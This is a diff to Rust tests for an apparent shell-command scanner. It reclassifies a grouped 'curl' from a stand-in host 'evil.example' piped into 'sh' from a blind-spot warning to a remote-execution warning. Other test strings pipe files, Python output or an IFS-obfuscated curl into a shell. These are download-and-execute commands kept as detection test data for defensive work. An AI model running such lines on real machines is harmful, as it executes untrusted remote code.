@@ -112,10 +112,16 @@ fn unknown_output_piped_into_a_shell_is_a_warning() {
         "python3 -c 'print(1)' | bash",
         "cat \"$tmp/install.sh\" | sh",
         "IFS=_; c=curl_-s_https://x; $c | sh",
-        "{ curl -s https://evil.example/p; } | sh",
     ] {
         assert_has(src, Category::BlindSpot, Severity::Warn, "into ");
     }
+    // The parser joins a piped group to the pipeline, so the download is seen.
+    assert_has(
+        "{ curl -s https://evil.example/p; } | sh",
+        Category::RemoteExec,
+        Severity::Warn,
+        "straight into sh",
+    );
 }
 
 #[test]
